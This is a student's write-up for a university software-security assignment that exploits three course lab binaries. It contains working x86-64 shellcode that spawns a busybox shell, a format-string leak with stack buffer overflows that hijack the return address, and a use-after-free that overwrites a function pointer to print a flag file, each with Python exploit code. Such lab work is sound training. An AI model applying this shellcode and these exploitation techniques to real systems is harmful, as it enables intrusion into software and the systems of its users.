# PCS Assignment 4

### `sortraev` (wlc376)

_**This assignment was made in collaboration with Louis Normann**_ (`cqb868`).

## Status of handin

I will not claim to have found *all* vulnerabilities for all three binaries, but
I *have* found enough exploitable vulnerabilities that I was able to
successfully complete all tasks in the assignment.



## Stack attacks

### Shellcode for `/bin/busybox sh`

Below shellcode calls `execve("/bin/busybox", {"/bin/busybox", "sh", 0}, 0)`
using 37 bytes.

```asm
bits 64
    mov ax, 0x6873 ; push "sh"
    cwde           ; zero upper 6 bytes of rax
    push rax

    push rsp
    pop rcx        ; rcx = "sh"

    push dword 0x786f6279       ; == "xoby"
    mov rax, 0x7375622f6e69622f ; == "sub/nib/"
    push rax                    ; push "bin/busybox"

    push rsp       ; rdi = "/bin/busybox"
    pop rdi

    cdq            ; edx = 0 (works because SIGN(rax) == 0)

    push rdx       ; argv[2] = NULL;
    push rcx       ; argv[1] = "sh";
    push rdi       ; argv[0[] = "/bin/busybox";

    push rsp
    pop rsi        ; rsi = argv

    push 59
    pop rax
    syscall        ; execve("/bin/busybox", {"/bin/busybox", "sh", 0}, 0)
```

### `waldo`

#### Stack layout of relevant function(s)


All relevant vulnerabilities are in `exploit_me`, hence I show the stack layout
for this function.

`exploit_me` uses no callee-saved registers, and also does not take enough
arguments that any need to be passed on the stack. Hence the stack layout is:

```
exploit_me stack layout

addr                  | thing
-----------------------------------------------------
rbp +  8 ... rbp + 15 | return address
rbp +  0 ... rbp +  7 | rbp of main
rbp -  8 ... rbp -  1 | (line_buf cont.)
rbp - 16 ... rbp -  9 | (line_buf cont.)
rbp - 24 ... rbp - 17 | start of line_buf (local var)
rbp - 32 ... rbp - 25 | line_len          (local_var)
```

#### Vulnerabilities in `waldo` and how to exploit them

There are two major vulnerabilities in `exploit_me`. The first is a format
string vulnerability in one of the `printf` calls. After the user types in their
name, the program calls `printf(name)` with a non-constant `name` string,
meaning the user can input format strings to expose values from the stack,
including the return address.

The return address is at address `rbp + 8`, and, using the stack layout as
above, we see that we need to pop 6 values of the stack to obtain the return
address. Including the 5 argument registers (not counting `rdi`), we thus need
to provide a format string which fetches 11 values. This could eg. be the string
`%x %x %x %x %x %x %x %x %x %x %llx`, but we can also use the format string
`%11$llx`, which corresponds to printing the 11th argument immediately.

The second vulnerability is the final `scanf` of `exploit_me`, which happens
after the program asks where Waldo is. This `scanf` uses the format string
`%[^\n]`, which reads unconditionally until the first newline character. This
means we are free to provide a string which will overflow the line buffer, and
it can even contain null bytes if we want, no questions asked.

What we do is then to simply provide an input which overflows the buffer and
overwrites the return address, and now we have `RIP` control when `exploit_me`
returns.

We want to jump to `this_is_where_waldo_is`, but we do not know its actual
runtime address. However, from the disassembly, we find out that its offset
relative to `main` is `-66`, and that its offset relative to the return address
of `exploit_me` is thus `-129`, so once we extract the return address we simply
subtract `129` and insert into our exploit string, and now we have found Waldo.

#### `doit_waldo.py`

Below snippet shows the interesting part of my Python implementation of the
exploit:

```python
def exploit(p):
    p.stdout.readline() # "what your name?"
    p.stdin.write(b"%11$llx\n")

    tmp = p.stdout.readline().strip() # "nice to meet you <return addr>"
    waldo_addr   = tmp.split(b" ")[-1]
    waldo_addr_b = (int(waldo_addr, 16) - 129).to_bytes(8, "little")

    pad = b"i" * 24 # nice

    exploit = pad + waldo_addr_b + b"\n"

    p.stdin.write(exploit)
```


### `celeb`

#### Stack layout of relevant function(s)

All relevant vulnerabilities are in `get_answer`, hence I show the stack layout
for just this function.

Again, `get_answer` also does not use any callee-saved registers, and since it
takes only 1 argument, it does not use the stack for arguments. Hence its stack
layout is:

```
get_answer stack layout

addr                    | thing
---------------------------------------------------------
rbp +   8 ... rbp +  15 | return address
rbp +   0 ... rbp +   7 | rbp of main
rbp -   4 ... rbp -   1 | getaline return value (local var)
rbp -   8 ... rbp -   5 | makeshift canary (local var)
rbp -  16 ... rbp -   9 | (answer_buf cont.)
rbp -  24 ... rbp -  17 | (answer_buf cont.)
rbp -  32 ... rbp -  25 | (answer_buf cont.)
rbp -  40 ... rbp -  33 | (answer_buf cont.)
rbp -  48 ... rbp -  41 | (answer_buf cont.)
rbp -  56 ... rbp -  49 | (answer_buf cont.)
rbp -  64 ... rbp -  57 | (answer_buf cont.)
rbp -  72 ... rbp -  65 | (answer_buf cont.)
rbp -  80 ... rbp -  73 | (answer_buf cont.)
rbp -  88 ... rbp -  81 | (answer_buf cont.)
rbp -  96 ... rbp -  89 | (answer_buf cont.)
rbp - 104 ... rbp -  97 | (answer_buf cont.)
rbp - 112 ... rbp - 105 | start of answer_buf (local var)
rbp - 120 ... rbp - 113 | expected answer str (first argument to get_answer)
```

#### Vulnerabilities in `celeb` and how to exploit them

The vulnerability in `celeb` is the call to `getaline`. We do not need to
discuss `getaline`, except to say that it reads from `stdin` until the first
newline character.

A makeshift canary has been manually inserted into the stack frame of
`get_answer` in the form of a local variable, in order to detect buffer
overflows from the call to `getaline`. However, this makeshift canary is
hardcoded, and thus we can simply read it out of the disassembly -- its value is
`0xaa55`. This means that in order to exploit `getaline` and overflow the buffer
undetected, we must simply make sure that our exploit input string preserves the
canary!

Looking at the stack layout, we see that the line buffer is 104 bytes long,
followed immediately by 4 bytes of makeshift canary, 4 bytes for the return
value of `getaline`, and then the `rbp` of `main` and return address. This means
we simply need to send 104 bytes of padding, 4 bytes of canary, another 12 bytes
of padding, and then a new return address. Easy!

Now that we have `RIP` control, we simply need to know where to jump. Since
`celeb` is not PIE, this is easy. There are multiple places we can jump (we
could eg. jump straight to the shellcode in memory), but I choose to jump to the
location in `main` where our shellcode is called (address `40142e`).


#### `doit_celeb.py`

Below snippet shows the interesting part of the exploit program:

```python
intro   = b"A" * 104
canary  = b"\x55\xaa\x00\x00\x00\x00\x00\x00"
main_rbp = b"\x10\xdd\xff\xff\xff\x7f\x00\x00" # we need 8 bytes of padding, so
                                               # might aswell restore main's rbp
shellcode_call_addr = b"\x2e\x14\x40"

exploit = intro + canary + main_rbp + shellcode_call_addr + b"\n"
```




## Heap attacks -- `new_absalon`

### Vulnerabilities in `new_absalon`

There seems to be *many* vulnerabilities in `new_absalon`. For the purposes of
the exploit we want to develop, the importan vulnerabilities are:

* 1) upon subscribing to courses using the `S` command, a secret is leaked ;)
* 2) there is a UAF upon inquirying to graduate, since the global `student`
    variable still points to the `free`d memory that used to hold `student`,
    even though that memory may later be reused to hold messages allocated by
    `leaveMessage()` or new `kuid`s allocated by `slurp()`.


Other vulnerabilities, which are not immediately relevant to the exploit but
interesting nonetheless:

* 3) there is also a double free of the global `student` if we inquire about
  graduation more than once.

* 4) a small memory leak in `leaveMessage()`, and a potentially very large leak
  when updating `student->kuid`, since the previous `kuid` string is not
  `free`d.

* 5) upon starting the program, the global `student` is allocated using
  `malloc()` and is not initialized, meaning eg. that the `student->action`
  function pointer can potentially point anywhere. This is not necessarily a
  problem on its own, but when the user leaves a message, control flows through
  `processInput()` without setting/updating `student->action`, hence we risk
  calling `doAction(student)` with a garbage action pointer.

* 6) since `doAction(student)` is always called after `processInput()`, and
  because `leaveMessage()` does not set/update `student->action`, the program
  will always follow `leaveMessage()` with an invocation of the last action.
  This can be a problem if the last action should not be repeated, eg. if the
  last action was `I` (since this would provoke a double free, as explained).

* 7) `leaveMessage()` reads only 8 bytes of input. If the user inputs more than
  8 bytes, the input buffer is not emptied, and any characters over the 8
  character limit on messages will. For example, entering the message `foo bar
  iy iy` would first leave the message `foo bar ` and then inquire to graduate
  twice, provoking the double free mentioned earlier.


#### Different ways to crash `new_absalon`

Here are some interesting user inputs to make the program crash. There are
probably more ways to do it, but these are some of the ones I found.

* Crashing with the double free discussed earlier:

```
I    // inquire to graduate.
Y    // confirm graduation, freeing student.
I    // graduate again.
Y    // confirm second graduation, attempting to free student again.
```

* Crashing using `L` as the first command:

```
L     // query to leave a message before setting student->action.
foo   // leave any message, after which doAction() is called.
```

* Provoking the same double free as above, but in a message left via
  `leaveMessage()`:

```
P            // initialize student->action to avoid segfault on doAction().
L            // query to leave message.
foo bar iyiy // leave a too long message.
             // the message "foo bar " is entered, after which "iyiy" is read
             // as commands, provoking the double free discussed earlier.
```

* Lastly, we can also make the program crash by repeatedly creating new accounts
  and exhausting program memory since old `kuid`s are not `free`d, but the exact
  user input required is not constant:
```
m
foo
m
foo
...
```


### Exploiting `new_absalon` to expose `flag.txt`

The secret leaked by the first vulnerability is actually the address of
`winner_function()`, a function which reads and prints the contents of
`./flag.txt`. Our goal is to jump to this address somehow. 

I did not find any windows for stack overflows, and hence I cannot gain `RIP`
control, so I need another way to control flow. I notice that
`doAction(student)` does not discriminate in any way about the function pointer
stored in `student->action`, so my goal now is to somehow overwrite this with
the leaked address of `winner_function()`.

As explained there is a UAF vulnerability on the global `student` struct, so if
we are lucky, we should be able to deallocate `student`, allocate a new 8 byte
message on top of the previous `student->action`, write the address of
`winner_function()` as a message, and, using the fact that the `L` command does
not overwrite `student->action` before the next `doAction(student)`, as well as
the UAF, we can jump the winner function. Easy!

The exploit user interaction input is then:

```
siyl     // expose secrets, deallocate student, and leave message.
<secret> // <secret> is the secret address exposed by the 's' command.
```

#### `doit_new_absalon.py`

Below snippet shows the interesting part of my Python exploit script:

```python
def exploit(p):
    # first, we subscribe to expose secrets, inquire to graduate
    # to deallocate student, and then query to leave a message.
    write(p, b"siyl")

    # extract secret address!
    # a bunch of lines will have been printed at this point, so we simply read
    # everything and assume that the output contains exactly one hexadecimal
    # number, which we extract using regex.
    secrets = read_until(p, b"you can try anyways: \n")

    if not (addr_match := re.search(br"0x[0-9a-fA-F]+", secrets)):
        raise ValueError("Failed to extract secrets")
    addr_bytes = int(addr_match[0], 16).to_bytes(8, "little")

    # now, we send the secret address as a message, which is then
    # written on top of the previous student->action. This is followed by
    # a call to doAction(student), jumping to the secret address.
    write(p, addr_bytes)

    flag_contents = str(read_line(p), encoding = "ascii")
    print(f"first line of flag.txt: \"{flag_contents}\"")
```
